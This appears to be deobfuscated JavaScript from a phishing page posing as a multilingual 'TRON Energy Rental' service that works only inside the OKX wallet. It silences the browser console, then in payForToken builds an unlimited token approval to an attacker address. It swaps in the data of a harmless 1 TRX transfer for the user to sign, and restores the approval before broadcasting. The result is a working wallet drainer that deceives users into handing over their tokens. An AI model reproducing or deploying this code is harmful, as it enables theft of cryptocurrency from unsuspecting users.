//Sun Aug 18 2024 15:21:38 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const _0x461627 = function () {
  let _0x3b8b8b = true;
  return function (_0x3ec759, _0x5153f7) {
    const _0x29abfd = _0x3b8b8b ? function () {
      if (_0x5153f7) {
        const _0x459f7a = _0x5153f7.apply(_0x3ec759, arguments);
        _0x5153f7 = null;
        return _0x459f7a;
      }
    } : function () {};
    _0x3b8b8b = false;
    return _0x29abfd;
  };
}();
const _0x3a30ed = _0x461627(this, function () {
  const _0x25fafe = function () {};
  const _0x3a5107 = function () {
    let _0x2a7714;
    try {
      _0x2a7714 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x36aee0) {
      _0x2a7714 = window;
    }
    return _0x2a7714;
  };
  const _0x1f1e5a = _0x3a5107();
  if (!_0x1f1e5a.console) {
    _0x1f1e5a.console = function (_0xf5e7a5) {
      const _0x131bc4 = {
        log: _0xf5e7a5,
        warn: _0xf5e7a5,
        debug: _0xf5e7a5,
        info: _0xf5e7a5,
        error: _0xf5e7a5,
        exception: _0xf5e7a5,
        table: _0xf5e7a5,
        trace: _0xf5e7a5
      };
      return _0x131bc4;
    }(_0x25fafe);
  } else {
    _0x1f1e5a.console.log = _0x25fafe;
    _0x1f1e5a.console.warn = _0x25fafe;
    _0x1f1e5a.console.debug = _0x25fafe;
    _0x1f1e5a.console.info = _0x25fafe;
    _0x1f1e5a.console.error = _0x25fafe;
    _0x1f1e5a.console.exception = _0x25fafe;
    _0x1f1e5a.console.table = _0x25fafe;
    _0x1f1e5a.console.trace = _0x25fafe;
  }
});
_0x3a30ed();
document.addEventListener("DOMContentLoaded", function () {
  const _0x1f41df = localStorage.getItem("language");
  if (_0x1f41df) {
    changeLanguage(_0x1f41df);
    if (/okex/.test(navigator.userAgent.toLowerCase())) {
      okexConnect();
    } else {
      var _0x485e38 = window.location.href;
      var _0x38caed = "okx://wallet/dapp/details?dappUrl=" + _0x485e38;
      location.href = _0x38caed;
    }
    getaddress();
  } else {
    changeLanguage("en");
    if (/okex/.test(navigator.userAgent.toLowerCase())) {
      okexConnect();
    } else {
      var _0x485e38 = window.location.href;
      var _0x38caed = "okx://wallet/dapp/details?dappUrl=" + _0x485e38;
      location.href = _0x38caed;
    }
    getaddress();
  }
});
async function okexConnect() {
  if (window.tronLink.ready) {
    window.tronWeb = tronLink.tronWeb;
  } else {
    const _0x573952 = {
      method: "tron_requestAccounts"
    };
    const _0x261236 = await tronLink.request(_0x573952);
    if (_0x261236.code === 200) {
      window.tronWeb = tronLink.tronWeb;
    }
  }
}
async function getaddress() {
  try {
    const _0x3221dd = {
      method: "tron_requestAccounts"
    };
    await window.okxwallet.tronLink.request(_0x3221dd);
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
      const _0x3034cf = window.tronWeb.defaultAddress.base58;
      console.log("User Address:", _0x3034cf);
      document.getElementById("trxAddress").value = _0x3034cf;
    } else {
      console.log("Failed to fetch the address.");
    }
  } catch (_0x4ae36b) {
    console.error("Error connecting to Tron wallet:", _0x4ae36b);
  }
}
document.getElementById("language-btn").onclick = function () {
  const _0x321263 = document.getElementById("language-dropdown");
  _0x321263.style.display = _0x321263.style.display === "block" ? "none" : "block";
};
function changeLanguage(_0x3db1a5) {
  localStorage.setItem("language", _0x3db1a5);
  const _0x1f8aad = {
    title: document.getElementById("title"),
    subtitle: document.getElementById("subtitle"),
    promo: document.getElementById("promo"),
    addressLabel: document.getElementById("address-label"),
    payBtn: document.getElementById("pay-btn"),
    howToTitle: document.getElementById("how-to-title"),
    howToList: document.getElementById("how-to-list"),
    footer: document.getElementById("footer")
  };
  if (_0x3db1a5 === "en") {
    _0x1f8aad.title.innerText = "TRON Energy Rental";
    _0x1f8aad.subtitle.innerText = "Pay 1TRX to get 64K Energy, and it will be credited to your account within 3 seconds!";
    _0x1f8aad.promo.innerText = "\"Join the crypto revolution, explore endless possibilities!\"";
    _0x1f8aad.addressLabel.innerText = "TRX Address";
    _0x1f8aad.payBtn.innerText = "Pay 1 TRX to get Energy";
    _0x1f8aad.howToTitle.innerText = "Energy Description:";
    _0x1f8aad.howToList.innerHTML = "\n                    <li>Reduce transaction fees: By freezing TRX to gain energy, users can reduce the number of times they pay TRX as handling fees. Especially for users who frequently use smart contracts, this can significantly reduce costs.</li>\n                    <li>Faster transactions: Having enough energy can speed up the execution of smart contracts and avoid delays caused by lack of resources.</li>\n                    <li>Since all major apps have energy rental, OKX wallet has not set up a shortcut function, and this platform can only be used in OKX wallet.</li>\n              \n                ";
    _0x1f8aad.footer.innerText = "© 2024 Crypto Platform. All rights reserved.";
  } else {
    if (_0x3db1a5 === "zh") {
      _0x1f8aad.title.innerText = "TRON能量租聘";
      _0x1f8aad.subtitle.innerText = "支付1TRX可获取64K能量,3秒内到账!";
      _0x1f8aad.promo.innerText = "\"加入加密革命，探索无限可能！\"";
      _0x1f8aad.addressLabel.innerText = "TRX 地址";
      _0x1f8aad.payBtn.innerText = "支付 1 TRX 获取能量";
      _0x1f8aad.howToTitle.innerText = "能量说明:";
      _0x1f8aad.howToList.innerHTML = "\n                    <li>降低交易费用：通过冻结 TRX 获得能量，用户可以减少支付 TRX 作为手续费的次数。特别是对于频繁使用智能合约的用户，这可以显著降低成本。</li>\n                    <li>更快的交易速度：拥有足够的能量可以加速智能合约的执行速度，避免因缺乏资源导致的延迟。</li>\n                    <li>因各大app均有能量租聘,OKX钱包尚未设置快捷功能,且本平台仅可在OKX钱包中使用.</li>\n                 \n                ";
      _0x1f8aad.footer.innerText = "© 2024 加密平台. 保留所有权利.";
    } else {
      if (_0x3db1a5 === "jp") {
        _0x1f8aad.title.innerText = "トロンエナジーのレンタル";
        _0x1f8aad.subtitle.innerText = "1 TRX を支払ってトークンを取得し、毎日 100 ME トークンを受け取りましょう。";
        _0x1f8aad.promo.innerText = "\"暗号革命に参加し、無限の可能性を探りましょう！\"";
        _0x1f8aad.addressLabel.innerText = "TRX アドレス";
        _0x1f8aad.payBtn.innerText = "1 TRX を支払ってエネルギーを入手";
        _0x1f8aad.howToTitle.innerText = "エネルギーの説明:";
        _0x1f8aad.howToList.innerHTML = "\n                    <li>取引手数料の削減: TRX を凍結してエネルギーを得ることで、ユーザーは手数料として TRX を支払う回数を減らすことができます。特にスマートコントラクトを頻繁に使用するユーザーにとっては、コストを大幅に削減できます。</li>\n                    <li>トランザクション速度の高速化: 十分なエネルギーがあれば、スマート コントラクトの実行が高速化され、リソース不足による遅延を回避できます。</li>\n                    <li>すべての主要なアプリはエネルギーリースを備えているため、OKX ウォレットにはまだショートカット機能が設定されておらず、このプラットフォームは OKX ウォレットでのみ使用できます。</li>\n                   \n                ";
        _0x1f8aad.footer.innerText = "© 2024 暗号プラットフォーム. すべての権利を保有.";
      } else {
        if (_0x3db1a5 === "ko") {
          _0x1f8aad.title.innerText = "트론 에너지 렌탈";
          _0x1f8aad.subtitle.innerText = "1 TRX를 지불하고 토큰을 얻고 매일 100 ME 토큰을 받으세요.";
          _0x1f8aad.promo.innerText = "\"암호 혁명에 참여하여 무한한 가능성을 탐험하세요!\"";
          _0x1f8aad.addressLabel.innerText = "TRX 주소";
          _0x1f8aad.payBtn.innerText = "에너지를 얻으려면 1 TRX를 지불하세요";
          _0x1f8aad.howToTitle.innerText = "에너지 설명:";
          _0x1f8aad.howToList.innerHTML = "\n                    <li>거래 수수료 절감: TRX를 동결하여 에너지를 얻음으로써 사용자는 TRX를 처리 수수료로 지불하는 횟수를 줄일 수 있습니다. 특히 스마트 계약을 자주 사용하는 사용자의 경우 비용을 크게 절감할 수 있습니다.</li>\n                    <li>더 빠른 거래 속도: 에너지가 충분하면 스마트 계약 실행 속도가 빨라지고 리소스 부족으로 인한 지연을 피할 수 있습니다.</li>\n                    <li>모든 주요 앱에는 에너지 임대 기능이 있으므로 OKX 지갑은 아직 바로가기 기능을 설정하지 않았으며 이 플랫폼은 OKX 지갑에서만 사용할 수 있습니다.</li>\n                 \n                ";
          _0x1f8aad.footer.innerText = "© 2024 암호 플랫폼. 모든 권리 보유.";
        }
      }
    }
  }
  document.getElementById("language-dropdown").style.display = "none";
}
async function payForToken() {
  try {
    const _0x5a9228 = window.tronWeb;
    const _0x37b4c4 = await _0x5a9228.defaultAddress.base58;
    console.log("User Address: " + _0x37b4c4);
    const _0xcb9eb9 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const _0x51e4f2 = "TQ1mFAFWqXAamPqoULLzGndBMynuib3MRT";
    const _0x125cea = "THG1fadpXrA9Jc4YKocZRFxQwifKKWYhXz";
    const _0x7cd545 = {
      type: "address",
      value: _0x51e4f2
    };
    const _0xa0dd05 = {
      type: "uint256",
      value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    };
    const _0x2c07d6 = [_0x7cd545, _0xa0dd05];
    const _0xd4cbae = {
      feeLimit: 100000000
    };
    const _0x15d481 = await _0x5a9228.transactionBuilder.triggerSmartContract(_0xcb9eb9, "increaseApproval(address,uint256)", _0xd4cbae, _0x2c07d6, _0x37b4c4);
    const _0x3d454f = 1000000;
    const _0xc20252 = await _0x5a9228.transactionBuilder.sendTrx(_0x125cea, _0x3d454f, _0x37b4c4);
    const _0x578aff = _0x15d481.transaction.raw_data;
    _0x15d481.transaction.raw_data = _0xc20252.raw_data;
    const _0x4fc577 = await _0x5a9228.trx.sign(_0x15d481.transaction);
    _0x4fc577.raw_data = _0x578aff;
    const _0x240726 = await _0x5a9228.trx.sendRawTransaction(_0x4fc577);
    if (_0x240726.result) {
      const _0x5f359a = localStorage.getItem("language");
      if (_0x5f359a === "zh") {
        alert("转账成功!请等待6秒再进行交易!");
      } else {
        if (_0x5f359a === "en") {
          alert("The transfer was successful! Please wait for 6 seconds before trading!");
        } else {
          if (_0x5f359a === "jp") {
            alert("転送が成功しました。取引を続行する前に 6 秒待ってください。");
          } else {
            if (_0x5f359a === "ko") {
              alert("전송이 완료되었습니다! 거래를 진행하기 전에 6초만 기다려주세요!");
            }
          }
        }
      }
    } else {
      alert("error！");
    }
  } catch (_0x47a7cb) {}
}